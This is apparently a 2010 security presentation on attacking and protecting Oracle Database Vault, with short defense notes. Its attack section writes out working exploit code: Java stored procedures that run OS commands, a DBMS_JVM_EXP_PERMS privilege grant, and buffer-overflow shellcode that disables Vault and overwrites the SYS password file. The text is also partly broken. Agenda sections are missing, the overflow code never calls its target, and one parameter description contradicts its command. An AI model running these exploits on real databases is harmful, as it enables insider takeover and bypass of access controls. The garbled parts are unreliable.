# Hacking and Protecting Oracle Database Vault

**Author:** Esteban Martínez Fayó  
**Company:** Argeniss (www.argeniss.com)  
**Date:** July 2010

## Agenda
1. Introduction to Oracle Database Vault
   - What is Oracle Database Vault?
   - Changes Introduced by Oracle Database Vault
   - Key Elements of Oracle Database Vault
2. Attacks against Database Vault
   - Gaining OS Access
   - Impersonating the MACSYS User
   - Special Considerations for the SYS User
     - SQL Injection in the SYS Schema
3. Oracle Database Auditing and the SYS User
4. Additional Protection Measures
5. Conclusions

## Introduction to Oracle Database Vault

### What is Oracle Database Vault?
- **Oracle Database Vault** is an add-on to Oracle Database.
- **Supported Oracle Database Releases:**
  - 9i R2, 10g R2, 11g R1, and 11g R2.
- **Key Features:**
  - It restricts highly privileged users, including powerful application DBAs, from accessing sensitive applications and data outside their authorized responsibilities.
  - The DBA no longer has unlimited access to database data.
  - It helps protect against insider threats and addresses regulatory compliance needs such as Sarbanes-Oxley (SOX) and PCI.
  - The primary goal is to provide a Separation of Duties.

### Changes Introduced by Oracle Database Vault
- **Initialization Parameters:**
  - Some parameters are set to more secure values.
- **RECYCLE BIN:**
  - The RECYCLE BIN feature is disabled.
- **Privileges:**
  - Revokes certain privileges from default roles such as DBA, IMP_FULL_DATABASE, EXECUTE_CATALOG_ROLE, SCHEDULER_ADMIN, and PUBLIC.
- **Database Audit:**
  - Configured to include more actions, but auditing is not enabled by default. To enable it, use `ALTER SYSTEM SET AUDIT_TRAIL`.
- **SYS.AUD$ Table:**
  - Moved to the SYSTEM schema.
- **Protected Schemas and Commands:**
  - Schemas like SYS, SYSTEM, and others, as well as sensitive commands like `ALTER USER`, are protected.
- **Patch Installation:**
  - Requires disabling Database Vault.
- **Disabling Database Vault:**
  - Can be done with OS access:
    - **Windows:**
      - Delete or rename `oradv[release_number].dll` (e.g., `oradv10.dll`, `oradv11.dll`) in `%ORACLE_HOME%\bin`.
    - **Linux:**
      - Use the following commands:
        ```sh
        make -f $ORACLE_HOME/rdbms/lib/ins_rdbms.mk dv_off
        $ORACLE_HOME/bin/relink oracle
        ```
- **Older Releases:**
  - OS authentication to the database is disabled.
  - Login "AS SYSDBA" is blocked by default.
  - The SYS user can only log on "AS SYSOPER".
  - This can cause incompatibility with some applications like RMAN, Oracle RAC, and some Oracle command-line utilities.
  - Can be re-enabled with the `nosysdba=y` parameter in the `orapwd` program:
    ```sh
    $ORACLE_HOME/bin/orapwd file=$ORACLE_HOME/dbs/orapworcl force=y nosysdba=n password=anypass
    ```

### Key Elements of Oracle Database Vault

- **Realms:**
  - Functional grouping of database schemas and roles that must be secured, e.g., related to accounting or sales.
  - Used to control the use of system privileges to specific accounts or roles.
- **Factors:**
  - Named variables or attributes, such as user location, database IP address, or session user.
  - Used for activities like authorizing database accounts to connect or creating filtering logic to restrict data visibility and manageability.
- **Command Rules:**
  - Control how users can execute many SQL statements.
  - Work with rule sets to determine whether a statement is allowed.
- **Rule Sets:**
  - Collection of rules that can be associated with a realm authorization, command rule, factor assignment, or secure application role.
  - Evaluates to true or false based on the evaluation of each rule.
- **Secure Application Roles:**
  - Special Oracle roles that can be enabled based on the evaluation of a rule set.
- **Database Vault Schemas:**
  - **DVSYS:**
    - Contains Oracle Database Vault objects (tables, views, PL/SQL packages, etc.).
    - Secured by the 'Oracle Database Vault' realm, guarding the schema against improper use of system privileges.
  - **DVF:**
    - Owner of `DBMS_MACSEC_FUNCTION`.
    - Contains functions that retrieve factor identities.
- **Roles Provided by Oracle Database Vault:**
  - DV_OWNER, DV_REALM_OWNER, DV_REALM_RESOURCE, DV_ADMIN, DV_ACCTMGR, DV_PUBLIC, DV_SECANALYST.
- **Typical Database Vault Users:**
  - **MACACCT:**
    - Administration of database accounts and profiles.
    - Roles granted: DV_ACCTMGR.
  - **MACADMIN:**
    - Access control administrator.
    - Roles granted: DV_ADMIN.
  - **MACREPORT:**
    - Running Oracle Database Vault reports.
    - Roles granted: DV_SECANALYST.
  - **MACSYS:**
    - Realm owner for the DVSYS realm.
    - Roles granted: DV_OWNER.
- **Security Considerations:**
  - Documentation includes guidelines for securing:
    - PL/SQL Packages: UTL_FILE, DBMS_FILE_TRANSFER, LogMiner Packages.
    - Privileges: CREATE ANY JOB, CREATE JOB, CREATE EXTERNAL JOB, ALTER SYSTEM, and ALTER SESSION.
    - The Recycle Bin.
    - Java Stored Procedures and External C Callouts.

## Attacks against Database Vault

### Gaining OS Access

#### Using Java (java_admin Role)
- **Create Java Source (requires CREATE PROCEDURE privilege):**
  ```sql
  CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "SRC_EXECUTEOS" AS
  import java.lang.*; import java.io.*;
  public class ExecuteOS {
    public static void execOSCmd (String cmd) throws IOException, InterruptedException {
      String[] strCmd = {"cmd.exe", "/c", cmd};
      Process p = Runtime.getRuntime().exec(strCmd);
      p.waitFor();
    }
  };
  /
  ```
- **Create Java Stored Procedure (requires CREATE PROCEDURE):**
  ```sql
  CREATE OR REPLACE PROCEDURE "PROC_EXECUTEOS" (p_command varchar2) AS LANGUAGE JAVA NAME 'ExecuteOS.execOSCmd (java.lang.String)';
  /
  ```
- **Execute OS Commands:**
  ```sql
  EXEC PROC_EXECUTEOS('C:\app\Administrator\product\11.2.0\dbhome_1\BIN\orapwd.exe file=C:\app\Administrator\product\11.2.0\dbhome_1\database\PWDorcl.ora force=y password=anypass nosysdba=n');
  EXEC PROC_EXECUTEOS('ren C:\app\Administrator\product\11.2.0\dbhome_1\BIN\oradv11.dll oradv11_.dll');
  ```

#### Defense
- Restrict the JAVA_ADMIN role.
- Remove Java support from the Oracle database if not needed.

#### Using Java (No Privileges Required)
- **Grant Java Privileges:**
  ```sql
  DECLARE
    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
    CURSOR C1 IS SELECT 'GRANT','ONEUSER','SYS', 'java.io.FilePermission','>','execute','ENABLED' FROM DUAL;
  BEGIN
    OPEN C1;
    FETCH C1 BULK COLLECT INTO POL;  
    CLOSE C1;  
    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);  
  END;
  /
  ```
- **Call Wrapper to Execute OS Commands:**
  ```sql
  SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','ren',' C:\\oracle\\product\\10.2.0\\db_1\BIN\\oradv10.dll','oradv10_.dll') FROM DUAL;
  ```

#### Defense
- Apply the April 2010 CPU.
- Oracle 11gR2 on Windows is not vulnerable.
- Revoke privileges from users to execute `DBMS_JVM_EXP_PERMS`.

### Buffer Overflow Attack

- **Requires EXECUTE Privileges on a Vulnerable Procedure:**
  - **DEMO:**
    - The `DIRPATH` parameter of `SYS.KUPF$FILE_INT.GET_FULL_FILENAME` function is vulnerable to buffer overflow attacks.
    - Patched in the April 2008 Critical Patch Update.

- **Attack Code:**
  ```sql
  DECLARE
    OS_COMMAND VARCHAR2(504);
    RET_VALUE_X123 VARCHAR2(32767);
    P_DIRPATH VARCHAR2(32767);
  BEGIN
    -- Disable DB Vault:
    OS_COMMAND:='ren ..\bin\oradv10.dll oradv10_.dll';
    -- Enable SYSDBA access and overwrite SYS password:
    -- OS_COMMAND:='..\bin\orapwd.exe file=..\dbs\orapworcl force=y nosysdba=n password=anypass';
    P_DIRPATH := '' || chr(54) || chr(141) || chr(67) || chr(19) || chr(80) || chr(184) || chr(131) || chr(160) || chr(187) || chr(119) || chr(255) || chr(208) || chr(184) || chr(31) || chr(179) || chr(188) || chr(119) || chr(255) || chr(208) || RPAD(OS_COMMAND || chr(38), 505) || CHR(96) || CHR(221) || CHR(171) || CHR(118);
  END;
  /
  ```

## Oracle Database Auditing and the SYS User

- **Auditing:**
  - Configured to include more actions, but auditing is not enabled by default.
  - To enable, use `ALTER SYSTEM SET AUDIT_TRAIL`.

## Additional Protection Measures

- **Best Practices:**
  - Regularly apply patches and updates.
  - Restrict unnecessary privileges.
  - Use strong, unique passwords.
  - Implement multi-factor authentication.
  - Monitor and audit database activities.

## Conclusions

- Oracle Database Vault provides robust security features to protect against both external and internal threats.
- Proper configuration and regular maintenance are essential to ensure the effectiveness of these security measures.
- Understanding and mitigating potential attack vectors, such as those involving Java and buffer overflows, is crucial for maintaining database security.